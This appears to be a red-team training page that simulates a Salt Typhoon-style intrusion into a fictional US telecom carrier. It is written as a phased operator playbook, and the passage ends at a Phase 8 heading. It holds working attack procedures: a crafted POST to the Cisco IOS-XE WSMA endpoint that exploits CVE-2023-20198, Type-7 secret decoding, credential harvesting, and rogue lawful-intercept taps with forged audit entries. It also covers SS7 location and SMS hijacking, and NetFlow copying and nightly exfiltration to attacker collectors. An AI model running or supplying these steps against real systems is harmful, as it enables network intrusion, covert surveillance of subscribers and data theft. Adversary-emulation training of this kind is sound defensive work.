---
layout: training-page
title: "Salt Typhoon — Telecom Carrier Intrusion Simulation — Red Team Academy"
module: "Scenarios"
tags:
  - salt-typhoon
  - ghostemperor
  - china
  - telecom
  - lawful-intercept
  - cisco
  - long-dwell
  - nation-state
page_key: "scenarios-telecom-intrusion-salt-typhoon"
render_with_liquid: false
---

# Salt Typhoon — Telecom Carrier Intrusion Simulation

## Scenario Overview

This scenario emulates the Salt Typhoon campaign against US telecommunications carriers, publicly disclosed in early October 2024 by the Wall Street Journal and subsequently confirmed by joint advisories from CISA, the FBI, and the NSA. The simulated objective is persistent access to a fictional US Tier-1 carrier's lawful intercept (CALEA) infrastructure, with dwell time measured in months and exfiltration of historical wiretap data plus the real-time interception capability that comes with administrative control of the carrier's Lawful Intercept Administration Function (LIAF).

This is not a noisy intrusion. Telecommunications operators run their networks against well-understood traffic baselines; deviation from those baselines triggers Site Reliability and Network Operations alerts long before any Security Operations Center notices. Salt Typhoon-class operators spend weeks preparing each move, sit dormant for weeks between phases, and exfiltrate through the carrier's own peering relationships so that data leaves the way data normally leaves. The defender debrief at the end explains why standard corporate-tier detection — CrowdStrike on the laptop, Microsoft Defender on Exchange — is structurally irrelevant once an adversary has reached the routing and signaling plane.

All techniques described here are derived from public reporting: the CISA/FBI/NSA joint cybersecurity advisory on PRC-affiliated activity against telecom (November 2024), Trend Micro's Earth Estries research, Microsoft's GhostEmperor analysis, the WSJ October 4 2024 disclosure, and Cisco PSIRT advisories for the IOS-XE vulnerability chain. Nothing in this scenario should be interpreted as new attribution or new victim claims beyond what those sources state.

---

## Threat Actor Profile: Salt Typhoon

**Attribution:** People's Republic of China — Ministry of State Security (MSS) linked, per CISA/FBI/NSA joint cybersecurity advisory (November 2024)
**Also known as:** GhostEmperor (Kaspersky/Microsoft), FamousSparrow (ESET), Earth Estries (Trend Micro), UNC2286 (Mandiant)
**Active since:** 2019 (earliest documented activity)
**Primary motivation:** Strategic SIGINT collection — interception of political communications, foreign intelligence handlers, dissidents, journalists, government officials, and counterintelligence targeting against US lawful-intercept programs themselves
**Publicly named victims:** Verizon, AT&T, Lumen, T-Mobile (US carriers, per WSJ and follow-up reporting); additional hospitality and telecom targets across Southeast Asia per Trend Micro

### Known TTPs (from public intelligence)

| Category | Documented Technique |
| --- | --- |
| Reconnaissance | Active Scanning (T1595), Gather Victim Network Information (T1590), Search Open Technical Databases (T1596) |
| Initial Access | Exploit Public-Facing Application (T1190) — Cisco IOS-XE Web UI (CVE-2023-20198 + CVE-2023-20273), Valid Accounts from supply chain partners (T1078.004) |
| Execution | Command and Scripting Interpreter (T1059), Network Device CLI (T1059.008) |
| Persistence | Modify System Image (T1601) — firmware-resident implants on routers, Pre-OS Boot (T1542), Valid Accounts (T1078) |
| Privilege Escalation | Exploitation for Privilege Escalation (T1068) — IOS-XE privilege escalation, Valid Accounts (T1078) |
| Defense Evasion | Modify System Image (T1601.001), Impair Defenses: Disable or Modify Tools (T1562.001), Network Device Authentication (T1556.004) |
| Credential Access | Network Sniffing (T1040) — RADIUS/TACACS+ snooping, Credentials from Password Stores: Group Policy Preferences (T1552.006), Unsecured Credentials in Configuration Files (T1552.001) |
| Discovery | Network Service Discovery (T1046), System Network Configuration Discovery (T1016), Remote System Discovery (T1018) |
| Lateral Movement | Use Alternate Authentication Material (T1550), Remote Services (T1021), Lateral Tool Transfer (T1570) |
| Collection | Automated Collection (T1119), Data from Configuration Repository: SNMP MIB Dump (T1602.001), Network Sniffing (T1040) |
| Command and Control | Protocol Tunneling (T1572), Non-Application Layer Protocol (T1095) |
| Exfiltration | Exfiltration Over Alternative Protocol (T1048), Exfiltration Over C2 Channel (T1041), Transfer Data to Cloud Account (T1537) |

### Operational Characteristics

Salt Typhoon is distinguished from most PRC-aligned activity by its discipline at the network-infrastructure layer. The operators do not behave like a corporate intrusion crew that happens to be on a router; they behave like network engineers who happen to be hostile. Key characteristics from public reporting:

- **Living on vendor tooling.** Operators prefer to operate from the vendor's own management surfaces (Cisco Prime Infrastructure, Cisco DNA Center, Ericsson ENM, Juniper Space) rather than dropping novel binaries. When binaries are dropped, they are pre-positioned on routers and use vendor-signed code paths.
- **Months of dormancy.** After initial access is established, weeks may pass before a second action is taken. This pre-empts incident-response timelines: by the time the first finding surfaces, the relevant logs have already aged off.
- **Configuration-only collection where possible.** Many of the most useful targets — call routing, signaling tables, lawful-intercept tap definitions — are configuration data, not files. Configuration can be exfiltrated as a few-KB TFTP/SCP transfer that looks identical to a routine NOC backup.
- **Exfiltration through carrier peering.** Where corporate intrusions need to find an egress path, Salt Typhoon uses the carrier's own peering relationships. The data leaves as IP packets sourced from the carrier's own ASN, riding the same paths customer traffic rides.
- **CALEA awareness.** The targeting of lawful-intercept systems is deliberate and informed. Operators know the structure of US CALEA compliance, the segmentation expectations, and where the LIAF management plane reaches.

---

## Target Profile: TitanCarrier US

**Organization:** TitanCarrier US (fictional)
**Industry:** US Tier-1 wireline + wireless carrier with regional ILEC heritage and a nationwide mobile network
**Headcount:** ~50,000 employees across corporate HQ, three Network Operations Centers (NOCs), and field operations
**Crown jewel:** Lawful Intercept Administration Function (LIAF) — the CALEA-mandated administrative system that provisions and retrieves court-ordered intercepts
**Secondary crown jewels:** Subscriber Database (HSS/HLR), call detail record (CDR) warehouse, signaling control points, customer-facing OSS/BSS that exposes customer location and call history

### Technology Stack

| Layer | Technology |
| --- | --- |
| Core IP routing | Cisco IOS-XR on ASR 9000 / NCS 5500 backbone, BGP to multiple Tier-1 transit and IX peers |
| Edge / Aggregation | Cisco IOS-XE on ASR 1000 / Catalyst 8500, Juniper MX on selected POPs |
| Wireless Core | Ericsson 4G/5G EPC + 5GC, Element Manager (ENM) for OAM |
| Voice / Signaling | Oracle Communications Session Border Controller (SBC), legacy Signaling Transfer Points (STPs) for SS7, Diameter Routing Agents (DRAs) for 4G/5G |
| OSS / BSS | Amdocs CRM + billing, in-house provisioning glue, Cisco Prime Infrastructure + DNA Center for network management |
| CALEA / LIAF | Vendor-supplied Lawful Intercept Administration Function in an air-gapped CALEA enclave; provisioning interface to switches via dedicated mediation devices |
| Identity for devices | TACACS+ (Cisco ACS / ISE) for network device AAA, RADIUS for OAM, shared secrets stored in device configs |
| Identity for employees | Active Directory + Azure AD, Okta for SaaS, MFA on corporate apps |
| Endpoint | CrowdStrike Falcon on corporate Windows/Mac fleet, NOT deployed on network gear or NOC jump hosts |
| Monitoring | Splunk Enterprise Security SIEM, NetFlow collectors (in-house), syslog aggregation from devices, SNMP via PRTG and SolarWinds |

### Security Maturity

TitanCarrier presents the maturity pattern typical of large US carriers: strong corporate security, weak network-operations security. The asymmetry is not accidental — corporate security is staffed and budgeted to satisfy SEC, SOX, and customer-facing requirements; network operations security is staffed to keep the network running, with security as a secondary concern delegated to vendor defaults.

Specific maturity gaps that operators rely on:

- **Shared TACACS+ deployment.** A single TACACS+ infrastructure serves the corporate network gear and the NOC. Compromise of TACACS+ credentials yields access to thousands of devices.
- **Loosely segmented NOC ↔ corporate.** The NOC jump hosts and the corporate environment share Active Directory trust and overlapping admin populations. Lateral movement from a compromised corporate workstation into the NOC is not architecturally hard.
- **CALEA air-gap is not absolute.** The CALEA collection plane is air-gapped from the data network, but the LIAF management VLAN reaches the NOC for operational reasons (provisioning, status, audit). This is the single highest-leverage architectural weakness.
- **EDR coverage stops at the network plane.** CrowdStrike runs on corporate endpoints. There is no equivalent for IOS-XR, IOS-XE, Junos, or the Ericsson core. Once an adversary is on a router, no behavioral analytics watch them.
- **Vendor management consoles are crown jewels.** A single Cisco Prime / DNA Center instance manages thousands of devices. The console is not treated with the same protection as a domain controller, but its compromise is functionally equivalent at the network layer.

This is not a soft target — TitanCarrier passes its audits, runs a competent corporate SOC, and detects routine threats well. It is, however, the typical US carrier security posture, and Salt Typhoon-class tradecraft is specifically calibrated to it.

---

## Phase 1 — External Reconnaissance

**ATT&CK Tactic:** Reconnaissance (TA0043)
**Techniques:** Active Scanning (T1595), Search Open Technical Databases: WHOIS, DNS, ASN (T1596.002, T1596.001), Gather Victim Identity Information (T1589), Search Victim-Owned Websites (T1594)

### Objective

Build a complete picture of TitanCarrier's externally visible infrastructure, the engineers who administer it, and the vendor relationships that touch the network — all before any packet is sent to an authentication surface.

### Execution

```bash
# Step 1: ASN to prefix enumeration
# Identify TitanCarrier's ASNs from public BGP looking glasses and PeeringDB:
whois -h whois.radb.net -- '-i origin AS65001' | grep -E '^route:'
# Pull the full prefix set for the carrier's ASNs (typically multiple ASNs
# per US Tier-1 — legacy ILEC, mobile, business services, transit)

# Cross-reference with bgp.he.net / bgp.tools for current advertisement state
curl -s "https://bgp.tools/data/asns.csv" | grep -i titancarrier

# Step 2: Identify management-plane exposure on those prefixes
# Cisco IOS-XE web UI typically lives on 443/HTTPS with a recognizable banner
# Operators avoid full Internet scans — they use existing scan data:
shodan search 'http.title:"Cisco" port:443 net:198.51.100.0/22'
shodan search 'http.html:"Web Services Management Agent" port:443'
# These dorks identify IOS-XE WMA / WebUI exposure without touching the target

# Censys query equivalent:
# services.tls.certificates.leaf_data.subject.common_name:"*.titancarrier.net"
#   and services.port=443 and services.http.response.html_title:"Cisco"

# Step 3: Employee enumeration via LinkedIn
# Salt Typhoon-style targeting is narrow — operators do not need 500 employees,
# they need 5 with the right title:
#   - "Network Engineer III/IV" with IOS-XR / IOS-XE / BGP keywords
#   - "CALEA Compliance" / "Lawful Intercept" — rare titles, very small populations
#   - "NOC Engineer" with shift schedule keywords
#   - "Vendor TAC" — Cisco/Ericsson contractors embedded with the carrier
python3 linkedin2username.py -c titancarrier -n 200 -s 0 \
  --keywords "network engineer,calea,noc,lawful intercept"

# Step 4: Vendor relationship intelligence
# Earnings call transcripts, government procurement filings, conference
# speaker lists, and vendor case studies reveal who runs what at the carrier:
#   - "Ericsson awarded ... TitanCarrier 5G core" -> ENM admin path
#   - "Cisco TAC partnership" -> which Cisco engineers have escalated access
#   - SAM.gov FCC filings -> CALEA point-of-contact at the carrier
# This intelligence guides Phase 2 target selection.

# Step 5: Certificate transparency for subdomain / hostname discovery
curl -s "https://crt.sh/?q=%25.titancarrier.net&output=json" | \
  jq -r '.[].name_value' | sort -u
# Expect to find: noc.titancarrier.net, mgmt.titancarrier.net,
#                 prime.titancarrier.net, tac.titancarrier.net,
#                 ssh-bastion.titancarrier.net — each is a potential pivot point

# Step 6: Public CVE / advisory monitoring for the stack
# Map the disclosed Cisco IOS-XE CVEs in Phase 2 to actual TitanCarrier devices
# by fingerprinting versions visible in TLS certificates and HTTP response headers
```

**Decision Point:** Operators do not move to Phase 2 until they can name with confidence (a) a small set of internet-reachable IOS-XE devices and (b) at least one supply-chain partner whose credentials would be plausible if observed in TACACS+ logs. Without both, the operation waits.

---

## Phase 2 — Initial Access

**ATT&CK Tactic:** Initial Access (TA0001)
**Techniques:** Exploit Public-Facing Application (T1190), Valid Accounts (T1078.004)

### Primary Vector: Cisco IOS-XE CVE-2023-20198 + CVE-2023-20273 Chain

In October 2023, Cisco PSIRT disclosed CVE-2023-20198, a privilege escalation vulnerability in the IOS-XE Web Services Management Agent that allowed unauthenticated remote attackers to create a privilege-15 (full admin) local account. CVE-2023-20273 followed as a chained command-injection that let that new account write to disk and install persistence. Public reporting attributed mass exploitation of the chain to multiple actors, with PRC-aligned activity specifically called out by CISA. The implant family commonly delivered through this chain has been documented under the name **BadCandy**.

### Background: Why the Web UI Is Exposed

Internet-facing IOS-XE Web UI is not supposed to exist on a carrier backbone. It does exist on a small but non-zero population of devices for one of three operational reasons:

1. **Out-of-band management interfaces** that were intended to be on a private management network but were placed on a public IP due to a circuit-provisioning shortcut.
2. **Lab and pre-production devices** that were stood up with WMA enabled, never re-hardened, and then connected to production.
3. **Customer-edge CPE under managed-service contracts** where the carrier manages the device on behalf of the customer over the public internet.

Salt Typhoon-class operators do not need many such devices. One is enough to enter the carrier's management plane.

### Execution

```bash
# Step 1: Confirm the target is vulnerable
# CVE-2023-20198 is identifiable by a successful unauthenticated POST to the
# WMA endpoint that creates a new local user. The check is non-destructive
# if performed as a status query rather than a user-create:
curl -sk "https://target-iosxe.example/webui/logoutconfirm.html?logon_hash=1"
# A response that returns the WMA-stamped HTML (rather than a 404 or
# a redirect to a hardened landing page) confirms the surface is live.

# Step 2: Create the privileged local account (CVE-2023-20198)
# The actual exploit POST is a crafted request to the WMA OpenAPI endpoint
# that injects an "exec privilege 15 user add" equivalent. Operators do not
# run public PoC tooling — they ship their own implementation that does not
# leave the public PoC's fingerprint. Conceptually:
curl -sk -X POST "https://target-iosxe.example/%25/webui_wsma_HTTP" \
  -H "Content-Type: application/xml" \
  --data-binary @- <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/">
  <SOAP:Body>
    <request correlator="forge-1" xmlns="urn:cisco:wsma-config">
      <configApply details="all">
        <config-data>
          <cli-config-data>
            <cmd>username svc-mgmt privilege 15 secret 0 REDACTED</cmd>
          </cli-config-data>
        </config-data>
      </configApply>
    </request>
  </SOAP:Body>
</SOAP:Envelope>
EOF
# The new account is now usable via SSH / NETCONF / Web UI with privilege 15

# Step 3: Authenticate as the new account and stage the implant (CVE-2023-20273)
# CVE-2023-20273 lets a privileged user inject OS-level commands that write
# files outside the IOS-XE confines and install a kernel-level implant
# (BadCandy-family). The implant lives as an HTTP backdoor served from a
# specific URI path that requires an attacker-chosen header for activation:
ssh svc-mgmt@target-iosxe.example
target# request platform software trace boot ...   # (vendor-supported entry)
target# request shell                              # operator escapes to Linux shell
# Implant install runs from the Linux shell with the implant binary delivered
# over the same TLS session

# Step 4: Verify implant activation without leaving NOC-visible footprints
curl -sk "https://target-iosxe.example/%25/some/innocuous/path" \
  -H "X-Forge-Magic: REDACTED"
# A correctly activated implant returns a non-error response that the
# NOC will interpret as a normal device probe; the implant header is the
# only trigger that exposes the backdoor surface.

# Step 5: SLEEP
# Operator discipline: no further action on this device for 7+ days.
# This window allows any reactive scanning the carrier's SOC may perform
# in response to mass-exploitation news to complete and conclude before
# operator activity resumes. Multiple CISA advisories and Cisco PSIRT
# updates flow through this window — the operator monitors them too.
```

### Secondary Vector: Supply Chain Partner Credentials

If the IOS-XE chain is unavailable (patched, not internet-reachable, or already saturated by competing actors), the secondary vector is stolen credentials from a third-party Managed Service Provider that supports the carrier. The MSP holds TACACS+ accounts on TitanCarrier's network gear to satisfy operational handoffs. Compromise of the MSP yields working network-device credentials without ever exploiting a carrier-side surface.

```bash
# The MSP attack surface is its own scenario (a corporate intrusion against
# a smaller, less-defended target). What matters here is what arrives at
# TitanCarrier: a working TACACS+ username and password with privilege 15
# on a population of TitanCarrier devices.

# Operator uses the stolen creds against a low-importance carrier device
# to validate they work, then waits another week before doing anything else.
ssh msp-svc-acct@noc-mgmt-router.titancarrier.net
# Successful login. Operator runs ONE command — 'show clock' — and exits.
# 'show clock' is benign, common, and does not appear in command-accounting
# alerts. It establishes that the credential is alive without doing anything
# that would be flagged.
```

---

## Phase 3 — Lateral Movement to NOC

**ATT&CK Tactic:** Lateral Movement (TA0008), Credential Access (TA0006)
**Techniques:** Use Alternate Authentication Material (T1550), Unsecured Credentials in Configuration Files (T1552.001), Remote Services (T1021)

### Objective

Convert the foothold on a single IOS-XE device into administrative reach across the NOC management plane: the Cisco Prime Infrastructure / DNA Center instance and the NOC jump hosts that operate the rest of the network.

### Execution

```bash
# Step 1: Harvest the local device configuration
# Every IOS-XE / IOS-XR device holds in its running config: TACACS+ shared
# secrets, RADIUS shared secrets, SNMP community strings, NETCONF
# credentials, and (often) cleartext passwords for service accounts that
# tooling uses to log into peers.
target# show running-config | redirect bootflash:/tmp/.rc.txt
target# more bootflash:/tmp/.rc.txt
# Extract:
#   tacacs server PRIMARY
#     key 7 0822455D0A16        <- Cisco Type-7, trivially reversible
#   snmp-server community CARRIER_RO RO
#   snmp-server community CARRIER_RW RW
#   ntp authentication-key 1 md5 0 REDACTED

# Type-7 decode (Vigenere with known key):
python3 -c "
import sys
key='dsfd;kfoA,.iyewrkldJKDHSUB'
enc=sys.argv[1]; seed=int(enc[:2]); ciphertext=bytes.fromhex(enc[2:])
print(''.join(chr(b^ord(key[(seed+i)%len(key)])) for i,b in enumerate(ciphertext)))
" 0822455D0A16

# The shared TACACS+ key is the high-leverage item. With it, the operator
# can stand up a rogue TACACS+ listener that fields auth requests from any
# device that trusts the same key (most of the carrier's network).

# Step 2: Pivot to the NOC jump host
# IOS-XE devices in carrier deployments routinely accept management
# connections from a small set of NOC jump hosts. The operator now logs
# OUT of the IOS-XE device, and INTO the NOC jump host using the MSP
# credential from Phase 2, sourced from an attacker IP that the operator
# expects the NOC to consider "out of policy" — but the device-side AAA
# may permit it because TACACS+ authorization is permissive for MSP accts.
ssh msp-svc-acct@noc-jump-01.titancarrier.net

# Step 3: Survey the NOC jump host
# NOC jump hosts are usually Linux (RHEL/CentOS) and host the tooling
# the operations team uses to reach the network:
ls -la /opt/                  # operational tooling
ls -la /home/                 # other engineer homedirs
cat /etc/ansible/hosts        # entire network inventory in one file
cat ~/.ssh/config             # configured SSH targets and jump chains

# The /etc/ansible/hosts file alone is gold: every device, every group,
# every credential variable reference. From here, the operator has a map
# of every device the NOC can reach — which is functionally every device
# in the carrier's network.

# Step 4: Reach the Cisco Prime / DNA Center console
# Cisco Prime Infrastructure / DNA Center manage 1,000s of devices from
# a single web UI. Carriers commonly federate the console with corporate
# AD/Okta, and engineers in the "Network Operations" group have admin.
# The operator does not need to crack new credentials — the MSP service
# account or the IOS-XE local account, when used as an AD-bound principal,
# often has Prime/DNAC admin via inherited group membership.
firefox-headless https://prime.titancarrier.net/  \
  --auth msp-svc-acct@titancarrier.net:REDACTED
# Prime/DNAC offers: bulk push of configuration to all managed devices,
# device-image distribution (the operator can ship implants this way), and
# Telemetry showing exactly what NOC engineers are working on right now.
```

**OPSEC Note:** Every command above is also a command the legitimate NOC runs. The difference is volume and timing. Operators issue these commands once per device, spaced over days, during the hours that match the engineer whose credentials they are using. They do not run network-wide inventory queries; they ask for individual devices, in the order an engineer reading a ticket would ask.

---

## Phase 4 — OSS / BSS Penetration

**ATT&CK Tactic:** Discovery (TA0007), Collection (TA0009), Credential Access (TA0006)
**Techniques:** Remote System Discovery (T1018), Data from Configuration Repository (T1602), Network Sniffing (T1040)

### Objective

Reach the systems that define how calls are routed, how subscribers are authenticated, and how signaling is mediated — Ericsson ENM, Oracle SBC, and the provisioning glue between them. This is the layer that turns network access into telecommunications-specific intelligence.

### Execution

```bash
# Step 1: Reach Ericsson ENM from the NOC
# Ericsson Element Manager (ENM) is the OAM surface for the 4G/5G core.
# It is reachable from the NOC for legitimate reasons (the OAM team
# manages it). It is not reachable from corporate. The operator pivots
# from noc-jump-01 -> enm-oam-jump -> ENM itself.
ssh oam-svc@enm-oam-jump.titancarrier.net
oam-svc@enm-oam-jump$ ssh ericsson-admin@enm-master.titancarrier.net

# Step 2: Pull subscriber-affecting configuration
# Within ENM:
ericsson-admin@enm$ cmedit get * NetworkElement.* --table
# Inventory every Network Element (NE) the EPC/5GC manages.
ericsson-admin@enm$ cmedit get NetworkElement=HSS01 SubscriberData* --table > hss-snapshot.csv
# HSS holds: IMSI <-> MSISDN bindings, current location, authentication keys.
# The operator does not pull the full HSS — that would be visibly anomalous.
# Instead, the operator pulls scoped subsets matching the target list.

# Step 3: Exfiltrate from Oracle Communications SBC
# The SBC defines call routing policy. The operator needs read access to
# understand the call path of intercept targets:
ssh sbc-readonly@sbc-mgmt.titancarrier.net
sbc# show running-config sip-interface
sbc# show running-config session-agent
sbc# show running-config local-policy
# These define every external SIP peer and every call-routing rule.
# Copy the configs out via a single SCP that mimics the nightly backup:
sbc# copy running-config tftp://noc-backup-collector.titancarrier.net/sbc-cfg.txt
# The backup collector is attacker-aware — under operator control via Phase 3.

# Step 4: Network-sniff RADIUS to capture mobility credentials
# 4G/5G HSS authentication does not flow over RADIUS, but legacy and IMS
# subscriber services often still do. From an inserted SPAN port on the
# OAM network, capture authentication traffic:
tcpdump -i any 'udp port 1812 or udp port 1813' -w /tmp/radius.pcap -G 3600 -W 24
# Operator runs this for 24 hours, then exfiltrates the .pcap.
# RADIUS shared-secret reuse means a captured Access-Request can be replayed
# against the same RADIUS server with attacker-controlled attributes.

# Step 5: Pull the provisioning-layer database
# The provisioning glue is the most undocumented and most valuable system:
# it knows which subscribers map to which intercept targets, which numbers
# are routed where, and which lines have CALEA flags set.
# Database is typically Oracle 19c on a hardened host with read-only NOC
# accounts. The operator uses a NOC engineer's already-existing read-only
# account, paged through the data over a week, never exceeding the engineer's
# normal query volume.
```

**Decision Point:** If ENM access requires an HSM-bound certificate that the operator cannot reproduce, the OSS/BSS approach pivots to abusing the audit-export functionality, which often runs as a less-privileged service that signs its own queries.

---

## Phase 5 — CALEA / Lawful Intercept Access

**ATT&CK Tactic:** Collection (TA0009), Persistence (TA0003), Impact (TA0040)
**Techniques:** Data from Information Repositories (T1213), Account Manipulation (T1098), Modify System Image (T1601)

### Objective

Reach the LIAF — the Lawful Intercept Administration Function — and gain (a) historical wiretap retrieval against past CALEA-authorized intercepts, (b) real-time interception capability by provisioning attacker-chosen tap targets without subpoena, and (c) the ability to mask or delete entries from the LIAF audit log.

This is the crown-jewel objective and the most operationally dangerous phase. A single mistake here exposes the entire campaign. Operators run this phase with maximum caution: minimum query volume, single-target focus, and aggressive log hygiene afterward.

### Background: LIAF and Why It Reaches the NOC

The Lawful Intercept Administration Function is the CALEA-mandated administrative system through which law enforcement provisioning requests are received, authorized, and pushed to the network's mediation devices. The collection plane — where intercepted content is captured and stored — is air-gapped from the data network. But the LIAF management plane is not air-gapped from the NOC, because operations staff must provision, validate, and audit intercepts as part of routine work.

The architectural gap is therefore: data of intercepts is isolated, but configuration of intercepts is not. An adversary who controls the LIAF management plane can add tap definitions that direct collection to attacker-controlled mediation, change which subscribers are flagged for intercept, and read the historical intercept catalog.

### Execution

```bash
# Step 1: Reach the LIAF management VLAN from a NOC pivot
# LIAF mgmt is typically a /28 reachable from a small number of NOC
# jump hosts. Operator has one of those hosts from Phase 3.
ssh noc-eng@noc-jump-01.titancarrier.net
noc-eng@noc-jump-01$ ssh calea-admin@liaf-mgmt.titancarrier.net
# Authentication into LIAF uses a separate AAA from the rest of the
# network — usually a vendor-supplied IDM with hardware token. Operators
# arrive here via a stolen calea-admin credential, often harvested from
# a NOC engineer's local credential cache when they last logged into LIAF.

# Step 2: Enumerate the active intercept catalog
liaf# list intercepts --status active
# Returns the active CALEA-authorized intercepts: target identifier
# (IMSI / MSISDN / IP), case number, requesting agency, collection
# endpoint. Operator does not export this in bulk — they query individual
# targets matching counterintelligence interest.

# Step 3: Retrieve historical intercept data
liaf# get intercept-history --target +1-555-REDACTED --since 2023-01-01
# Historical intercept data includes call metadata, SMS content (where
# captured), and pen-register records. The retrieval generates a LIAF
# audit-log entry. Operator's plan for the audit log is in Step 5.

# Step 4: Provision attacker-controlled tap targets
# This is the most operationally significant step. The operator adds
# a new intercept definition routing to attacker-controlled mediation:
liaf# add intercept \
        --target IMSI=310410REDACTED \
        --case-id INT-2024-CARRIER-OPS-9931 \
        --collection-endpoint mediation-east-02.titancarrier.net \
        --duration 90d \
        --authorization-doc /var/calea/auth/INT-2024-9931.pdf
# The collection-endpoint refers to a mediation device that the operator
# has already prepared in Phase 4 — a real carrier-owned mediation host
# whose forwarding config has been silently amended to copy traffic to
# attacker infrastructure.

# OPSEC: Salt Typhoon-class operators keep the active attacker tap list
# small (low single digits) and rotate targets monthly. Bulk taps would
# trigger the LIAF's own consumption metrics, which carriers monitor
# loosely but do monitor.

# Step 5: Audit-log handling
# LIAF writes to its own append-only audit log. The operator does not
# delete entries — that would be visible in next-day reconciliation.
# Instead, the operator forges legitimate-looking parent records: an
# attacker tap is logged under a fabricated case ID that resembles a
# real ongoing case. To a reviewer skimming the log, the entry blends in.
liaf# audit-log inject \
        --case-id INT-2024-CARRIER-OPS-9931 \
        --justification "Routine CALEA provisioning per authorization"
# Salt Typhoon-style tradecraft prefers blending to deletion. Deletion
# leaves a hole; blending leaves a story.
```

**Operator Discipline:** This phase is conducted by the most-experienced operator on the team. Sessions are short (under 10 minutes), spaced over weeks, and never include experimental or exploratory commands. Every keystroke is pre-planned.

---

## Phase 6 — SS7 / Diameter Signaling Abuse from Inside

**ATT&CK Tactic:** Collection (TA0009), Discovery (TA0007), Impact (TA0040)
**Techniques:** Adversary-in-the-Middle (T1557), Data from Information Repositories (T1213), Network Sniffing (T1040)

### Objective

Operate inside the carrier's signaling plane to perform subscriber location queries, intercept SMS messages, and spoof call origination — capabilities that, outside the carrier, would require expensive SS7 access purchased on grey markets. From inside, they are configuration changes.

### Background

SS7 is the legacy signaling system that still underpins much of US mobile telephony — particularly SMS, voicemail, and roaming. Diameter is the IP-native successor used by 4G/5G core networks. Both systems were designed in an era when "the carrier is the trust boundary," meaning any node inside a carrier's SS7 / Diameter network is trusted by every other node. There is no per-message authentication.

An adversary on the inside can:

1. Send `SRI-SM` (Send Routing Info for SMS) queries to retrieve the IMSI and current MSC/SGSN/MME serving a target — yielding real-time location.
2. Send `AnyTimeInterrogation (ATI)` queries to ask the HLR/HSS for a subscriber's current cell.
3. Spoof `MO-ForwardSM` (Mobile-Originated SMS) to send SMS appearing to come from any number.
4. Hijack SMS by registering a Visitor Location Register that the HLR believes is serving the target — incoming SMS for that subscriber routes to the attacker's STP.

### Execution

```bash
# All of this is performed from a host inside the carrier's signaling
# network — typically a NOC-reachable jump host with SCTP connectivity
# to the carrier's Signaling Transfer Points (STPs) or Diameter Routing
# Agents (DRAs).

# Step 1: Validate signaling reachability
sctp_status -h dra-east-01.titancarrier.net -p 3868
# Confirms an active SCTP association is possible.

# Step 2: Subscriber location via SRI-SM
# Using a custom SS7 sender (operators carry their own tooling — open-source
# SigPloit-style code as a reference):
python3 ss7-tool.py sri-sm \
  --gt 1-555-VICTIM \
  --smsc carrier-smsc-1 \
  --hlr 1-555-HLR-PRIMARY
# Response contains: IMSI, current MSC/VLR address, network identifier.
# This is real-time location to cell-tower granularity.

# Step 3: SMS interception via VLR registration
# Operator instructs the HLR that the victim is now served by an
# attacker-controlled Visitor Location Register:
python3 ss7-tool.py update-location \
  --gt 1-555-VICTIM \
  --new-vlr attacker-vlr-via-noc \
  --new-msc attacker-vlr-via-noc
# All incoming SMS to the victim now routes to attacker-controlled
# infrastructure. The victim's phone may briefly lose service but
# typically reattaches to the legitimate VLR within minutes — the
# interception window is short but sufficient for one-time-password
# capture.

# Step 4: Diameter-side equivalents on 4G/5G targets
# For LTE/5G subscribers, the equivalents use Diameter:
#   Information Request (IDR) -> location
#   Cancel Location (CLR)     -> forcibly detach + re-register elsewhere
# The DRA accepts these from any internal Diameter peer; no per-peer
# authorization is enforced by default in many carrier configurations.
```

**OPSEC:** Signaling abuse is detectable by carriers that have deployed SS7/Diameter firewalls (Adaptive Mobile, Mobileum, P1 Security). TitanCarrier has not. Salt Typhoon-class operators check for firewall presence by issuing a single benign query and watching for rejection — if no firewall is present, the rest of the phase proceeds; if one is detected, the operator avoids signaling abuse entirely and relies on LIAF-only collection.

---

## Phase 7 — Long-Dwell Collection

**ATT&CK Tactic:** Collection (TA0009), Exfiltration (TA0010)
**Techniques:** Automated Collection (T1119), Data from Configuration Repository: SNMP MIB Dump (T1602.001), Exfiltration Over Alternative Protocol (T1048), Scheduled Transfer (T1029)

### Objective

Establish a sustainable, low-noise collection pipeline that yields ongoing intelligence over months. Salt Typhoon campaigns measure dwell time in 12+ month units. The collection apparatus must therefore be invisible, automated, and quiet enough that no SOC review will surface it.

### Execution

```bash
# Step 1: SNMP-based collection of routing and inventory telemetry
# Most US carriers run PRTG / SolarWinds polling all devices via SNMP
# v2c with cleartext community strings. Operators stand up an attacker
# collector inside the carrier and add its IP to the device SNMP
# permit-lists — visible only on per-device configs, not aggregated.
attacker-collector# snmpwalk -v2c -c CARRIER_RO 10.20.30.40 1.3.6.1.2.1.4.21
# 1.3.6.1.2.1.4.21 = ipRouteTable — every route, every next-hop, every
# interface. Across the entire network, this is the complete routing topology.

# Run periodically (matching the legitimate poller's cadence):
*/5 * * * * /opt/collector/snmp-walk-batch.sh

# Step 2: NetFlow staging to attacker-controlled in-carrier collector
# The carrier already runs NetFlow collectors. Operator adds the
# attacker-controlled collector as an additional destination on a
# subset of devices (the ones touching subscribers of interest):
target# flow exporter ATTACKER-COLLECTOR
target#   destination 10.99.99.99
target#   source Loopback0
target#   transport udp 9996
target# flow monitor SUBSCRIBER-FLOW
target#   exporter NOC-PRIMARY        <- legitimate
target#   exporter ATTACKER-COLLECTOR <- added by operator
# Now every flow record is sent to both the legitimate collector and
# the attacker's collector. The legitimate collector keeps working;
# nothing visible to the SOC has changed.

# Step 3: Slow exfiltration drip
# The attacker collector aggregates SNMP + NetFlow + occasional packet
# captures. Over months, this represents tens of GB. Exfiltration is
# scheduled as small bursts (50-200 MB each) at night, routed through
# the carrier's own peering to an attacker-controlled ASN that has a
# legitimate peering relationship with the carrier (often via an IX).
# Traffic leaves as IP packets from the carrier's own address space,
# riding the carrier's own peering — indistinguishable from customer
# traffic from a NetFlow-only perspective.

# Cron on the attacker collector:
0 3 * * * /opt/collector/exfil-drip.sh
# Each run pushes one .gz of aggregated data through the peering link,
# sourced from a different carrier IP each night (rotating among a
# pool of unused customer addresses the operator has claimed).

# Step 4: Operator review cadence
# The operator does not log in daily. Once per week, a session retrieves
# the latest aggregates. The carrier never sees the operator on its
# network during the long-dwell phase — only the in-carrier collector
# is active, and the collector is a legitimate-looking device the
# operator added to inventory in Phase 3.
```

---

## Phase 8 — Persistence and Plausible Cover

